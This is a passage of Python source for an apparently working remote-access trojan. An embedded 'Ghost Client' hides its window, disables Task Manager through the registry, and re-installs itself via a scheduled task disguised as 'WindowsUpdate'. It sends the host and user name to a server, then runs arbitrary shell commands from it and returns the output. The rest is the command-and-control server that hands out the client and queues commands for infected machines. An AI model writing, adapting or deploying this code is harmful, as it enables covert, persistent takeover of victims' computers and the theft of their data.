    def hide_process(self):
        """إخفاء النافذة"""
        try:
            if os.name == 'nt':
                ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        except:
            pass
    
    def block_task_manager(self):
        """حماية من Task Manager"""
        try:
            block_cmd = r'reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f'
            subprocess.run(block_cmd, shell=True, capture_output=True, timeout=5)
        except:
            pass
    
    def start_self_healing(self):
        """بدء نظام الشفاء الذاتي"""
        def monitor():
            while self.running:
                try:
                    # التحقق من وجود الملف المخفي
                    if not os.path.exists(self.hidden_path):
                        print("File missing - reinstalling...")
                        self.hide_and_protect()
                    
                    # التحقق من المهام المجدولة
                    result = subprocess.run('schtasks /query /tn "WindowsUpdate"', shell=True, capture_output=True, text=True)
                    if "WindowsUpdate" not in result.stdout:
                        self.install_persistence()
                    
                    time.sleep(60)  # تحقق كل دقيقة
                    
                except:
                    time.sleep(30)
        
        threading.Thread(target=monitor, daemon=True).start()
    
    def register_with_server(self):
        """التسجيل مع السيرفر"""
        try:
            data = {
                'client_id': self.client_id,
                'computer': platform.node(),
                'os': f"{platform.system()} {platform.release()}",
                'type': 'ghost_client',
                'user': getpass.getuser(),
                'status': 'active'
            }
            
            response = requests.post(
                f"{self.server_url}/register",
                json=data,
                timeout=10
            )
            
            if response.status_code == 200:
                self.registered = True
                return True
            return False
            
        except:
            return False
    
    def execute_command_immediately(self, command):
        """تنفيذ الأمر فوراً"""
        try:
            if command.strip() == "sysinfo":
                return self.get_system_info()
            elif command.strip() == "clean":
                return self.clean_old_versions()
            elif command.strip() == "protect":
                return self.block_task_manager() or "Protection activated"
            else:
                # تنفيذ الأمر مباشرة بدون انتظار
                result = subprocess.run(
                    command,
                    shell=True,
                    capture_output=True,
                    text=True,
                    timeout=30
                )
                output = result.stdout if result.stdout else result.stderr
                return output if output else "Command executed successfully"
                
        except subprocess.TimeoutExpired:
            return "Command timed out"
        except Exception as e:
            return f"Error: {str(e)}"
    
    def get_system_info(self):
        """معلومات النظام"""
        try:
            info = f"""
GHOST CLIENT - ACTIVE & PROTECTED
Computer: {platform.node()}
User: {getpass.getuser()}
OS: {platform.system()} {platform.version()}
Client ID: {self.client_id}
Status: ACTIVE & STEALTH
Hidden Path: {self.hidden_path}
Connection: {'CONNECTED' if self.registered else 'RECONNECTING'}
Protection: ENABLED
Auto-Start: GUARANTEED
"""
            return info
        except:
            return "System information available"
    
    def persistent_connection(self):
        """اتصال مستمر مع السيرفر"""
        def connection_worker():
            while self.running:
                try:
                    # محاولة التسجيل
                    if not self.registered:
                        if self.register_with_server():
                            print("✓ Connected to server")
                        else:
                            time.sleep(5)
                            continue
                    
                    # التحقق من الأوامر باستمرار
                    self.check_commands()
                    
                    # انتظر 2 ثانية فقط بين المحاولات
                    time.sleep(2)
                    
                except Exception as e:
                    time.sleep(5)
        
        threading.Thread(target=connection_worker, daemon=True).start()
    
    def check_commands(self):
        """التحقق من الأوامر الجديدة"""
        try:
            response = requests.get(
                f"{self.server_url}/commands?client={self.client_id}",
                timeout=10
            )
            
            if response.status_code == 200:
                data = response.json()
                if data.get('command'):
                    command = data['command']
                    print(f"Executing: {command}")
                    
                    # تنفيذ الأمر فوراً
                    result = self.execute_command_immediately(command)
                    
                    # إرسال النتيجة فوراً
                    requests.post(
                        f"{self.server_url}/response",
                        json={
                            'client_id': self.client_id,
                            'command': command,
                            'response': result
                        },
                        timeout=10
                    )
                    
        except:
            pass
    
    def start(self):
        """بدء العميل"""
        # إخفاء النافذة فوراً
        self.hide_process()
        
        print("Initializing Ghost Client...")
        
        # 1. تنظيف النسخ القديمة
        clean_result = self.clean_old_versions()
        print(f"Cleanup: {clean_result}")
        
        # 2. إخفاء وحماية الملف
        hide_result = self.hide_and_protect()
        print(f"Protection: {hide_result}")
        
        # 3. تثبيت التشغيل التلقائي
        persistence_result = self.install_persistence()
        print(f"Persistence: {persistence_result}")
        
        # 4. بدء أنظمة الحماية
        self.block_task_manager()
        self.start_self_healing()
        
        # 5. بدء الاتصال المستمر
        self.persistent_connection()
        print("Ghost Client activated - Auto-reconnect enabled")
        
        # الحلقة الرئيسية الخفيفة
        while self.running:
            time.sleep(1)

def main():
    client = GhostClient()
    client.start()

if __name__ == "__main__":
    main()
'''
        
        self.send_response(200)
        self.send_header('Content-Type', 'application/octet-stream')
        self.send_header('Content-Disposition', 'attachment; filename="enhanced_client.py"')
        self.end_headers()
        self.wfile.write(client_code.encode())

    def handle_client_register(self, data):
        with self.session_lock:
            client_id = data.get('client_id', str(uuid.uuid4())[:8])
            client_ip = self.client_address[0]
            incoming_user = data.get('user', 'Unknown')
            incoming_computer = data.get('computer', 'Unknown')
            incoming_os = data.get('os', 'Unknown')

            if incoming_user == 'Unknown' and '-' in client_id:
                try:
                    parts = client_id.split('-')
                    if len(parts) >= 2:
                        incoming_user = parts[1]
                        incoming_computer = parts[0]
                except:
                    pass
                
            existing_client = None
            for cid, client_data in self.sessions.items():
                current_user = client_data.get('user', '')
                current_computer = client_data.get('computer', '')

                if (current_user == incoming_user and 
                    current_computer == incoming_computer and 
                    incoming_user != 'Unknown' and 
                    incoming_computer != 'Unknown'):
                    existing_client = cid
                    break
                
            if existing_client is None and client_id in self.sessions:
                existing_client = client_id

            if existing_client:
                self.sessions[existing_client]['last_seen'] = datetime.now().isoformat()
                self.sessions[existing_client]['status'] = 'online'
                self.sessions[existing_client]['ip'] = client_ip

                if incoming_os != 'Unknown':
                    self.sessions[existing_client]['os'] = incoming_os

                print(f"✅ Updated client: {incoming_computer} ({incoming_user}) - OS: {incoming_os} - IP: {client_ip}")
                self.send_json({'success': True, 'client_id': existing_client})
            else:
                self.sessions[client_id] = {
                    'id': client_id,
                    'ip': client_ip,
                    'type': data.get('type', 'unknown'),
                    'computer': incoming_computer,
                    'os': incoming_os,
                    'user': incoming_user,
                    'first_seen': datetime.now().isoformat(),
                    'last_seen': datetime.now().isoformat(),
                    'pending_command': None,
                    'last_response': None,
                    'status': 'online'
                }
                print(f"🆕 New client: {incoming_computer} ({incoming_user}) - OS: {incoming_os} - IP: {client_ip}")
                self.send_json({'success': True, 'client_id': client_id})
                
    def send_sessions_list(self):
        with self.session_lock:
            current_time = datetime.now()
            active_clients = []
            
            for client_id, client_data in list(self.sessions.items()):
                last_seen = datetime.fromisoformat(client_data['last_seen'])
                if (current_time - last_seen).total_seconds() < 300:
                    client_data['is_online'] = (current_time - last_seen).total_seconds() < 60
                    active_clients.append(client_data)
                else:
                    del self.sessions[client_id]
                    print(f"Removed inactive client: {client_id}")
            
            self.send_json(active_clients)
    
    def handle_get_commands(self):
        with self.session_lock:
            parsed = urllib.parse.urlparse(self.path)
            query = urllib.parse.parse_qs(parsed.query)
            client_id = query.get('client', [None])[0]
            
            if client_id and client_id in self.sessions:
                self.sessions[client_id]['last_seen'] = datetime.now().isoformat()
                pending_command = self.sessions[client_id]['pending_command']
                
                if pending_command:
                    self.sessions[client_id]['pending_command'] = None
                    self.send_json({'command': pending_command})
                else:
                    self.send_json({'waiting': True})
            else:
                self.send_json({'error': 'Client not found'})
    
    def handle_execute_command(self, data):
        with self.session_lock:
            client_id = data.get('client_id')
            command = data.get('command')
            
            if client_id in self.sessions:
                self.sessions[client_id]['pending_command'] = command
                self.sessions[client_id]['last_seen'] = datetime.now().isoformat()
                self.send_json({'success': True})
                
                if hasattr(self, 'cursor'):
                    self.cursor.execute(
                        'INSERT INTO commands (client_id, command) VALUES (?, ?)',
                        (client_id, command)
                    )
                    self.conn.commit()
            else:
                self.send_json({'success': False, 'error': 'Client not found'})
    
    def handle_get_result(self):
        with self.session_lock:
            parsed = urllib.parse.urlparse(self.path)
            query = urllib.parse.parse_qs(parsed.query)
            
            client_id = query.get('client', [''])[0]
            command = query.get('command', [''])[0]
            
            if client_id in self.sessions and self.sessions[client_id]['last_response']:
                result = self.sessions[client_id]['last_response']
                self.sessions[client_id]['last_response'] = None
                self.send_json({'result': result})
            else:
                self.send_json({'pending': True})
    
    def handle_client_response(self, data):
        with self.session_lock:
            client_id = data.get('client_id')
            response = data.get('response')
            command = data.get('command')
            
            if client_id in self.sessions:
                self.sessions[client_id]['last_response'] = response
                self.sessions[client_id]['last_seen'] = datetime.now().isoformat()
                
                if hasattr(self, 'cursor'):
                    self.cursor.execute(
                        'UPDATE commands SET response = ? WHERE client_id = ? AND command = ? AND response IS NULL',
                        (response, client_id, command)
                    )
                    self.conn.commit()
            
            self.send_json({'success': True})
    
    def send_command_history(self):
        try:
            if hasattr(self, 'cursor'):
                self.cursor.execute('''
                    SELECT client_id, command, response, timestamp 
                    FROM commands 
                    ORDER BY timestamp DESC 
                    LIMIT 50
                ''')
                history = self.cursor.fetchall()
                
                result = []
                for row in history:
                    result.append({
                        'client_id': row[0],
                        'command': row[1],
                        'response': row[2],
                        'timestamp': row[3]
                    })
                
                self.send_json(result)
            else:
                self.send_json([])
        except:
            self.send_json([])
    
    def send_system_status(self):
        with self.session_lock:
            status = {
                'uptime': 'Running',
                'connected_clients': len([c for c in self.sessions.values() 
                                        if (datetime.now() - datetime.fromisoformat(c['last_seen'])).total_seconds() < 60]),
                'total_commands': 0,
                'server_time': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            }
            
            if hasattr(self, 'cursor'):
                self.cursor.execute('SELECT COUNT(*) FROM commands')
                status['total_commands'] = self.cursor.fetchone()[0]
            
            self.send_json(status)
    
    def send_404_page(self):
        self.send_error(404, "Page not found")
    
    def send_json(self, data):
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()
        self.wfile.write(json.dumps(data).encode())

def cleanup_sessions():
    while True:
        try:
            current_time = datetime.now()
            with EnhancedRemoteControlHandler.session_lock:
                for client_id, client_data in list(EnhancedRemoteControlHandler.sessions.items()):
                    last_seen = datetime.fromisoformat(client_data['last_seen'])
                    if (current_time - last_seen).total_seconds() > 300:
                        del EnhancedRemoteControlHandler.sessions[client_id]
                        print(f"Cleaned up inactive client: {client_id}")
            time.sleep(60)
        except:
            pass

def main():
    handler = EnhancedRemoteControlHandler
    handler.init_database(handler)
    
    threading.Thread(target=cleanup_sessions, daemon=True).start()
    
    print("=" * 70)
    print("🔒 ENHANCED REMOTE CONTROL SERVER - MULTI LAYER SECURITY")
    print("=" * 70)
    print("Control Panel:    http://localhost:8080")
    print("Web Client:       http://localhost:8080/remote")
    print("Python Client:    http://localhost:8080/download-python-client")
    print("Level 1 Password: ******")
    print("Level 2 Password: ******")
    print("Database:         remote_control.db")
    print("=" * 70)
    print("Server starting on port 8080...")
    print("Multi-layer security system activated")
    print("=" * 70)
    
    try:
        server = ThreadedHTTPServer(('0.0.0.0', 8080), EnhancedRemoteControlHandler)
        print("Server started successfully! Press Ctrl+C to stop.")
        print("Security Features: IP Blocking, Rate Limiting, Two-Factor Auth")
        server.serve_forever()
    except KeyboardInterrupt:
        print("Server stopped by user")
    except Exception as e:
        print(f"Server error: {e}")
    finally:
        if hasattr(handler, 'conn'):
            handler.conn.close()

if __name__ == "__main__":
    main()